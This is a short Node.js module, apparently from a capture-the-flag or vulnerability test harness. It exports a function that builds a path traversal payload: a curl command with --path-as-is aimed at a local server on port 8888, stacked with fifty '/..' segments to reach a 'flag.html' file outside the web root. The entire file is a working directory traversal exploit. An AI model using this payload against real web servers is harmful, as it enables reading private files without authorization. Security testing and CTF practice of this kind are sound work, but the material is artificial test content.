function getPayload() {
  const { resolve } = require('path'); // Import the resolve method from path

  function genstr(n) {
    return "/..".repeat(50) + resolve(__dirname, '../flag.html');
  }

  return {
    attack_string: `curl -v --path-as-is "http://127.0.0.1:8888${genstr()}"`
  };
}

module.exports = { getPayload };